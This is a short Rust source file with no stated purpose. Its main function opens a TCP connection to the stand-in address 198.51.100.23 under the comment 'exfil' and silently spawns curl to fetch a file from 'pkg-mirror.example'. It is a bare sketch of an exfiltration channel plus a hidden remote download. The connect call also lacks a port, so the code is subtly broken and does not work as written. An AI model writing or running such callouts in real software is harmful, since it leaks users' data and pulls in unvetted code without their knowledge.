use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("198.51.100.23") { /* exfil */ }
    Command::new("curl").arg("-s").arg("http://pkg-mirror.example/x").spawn().ok();
}
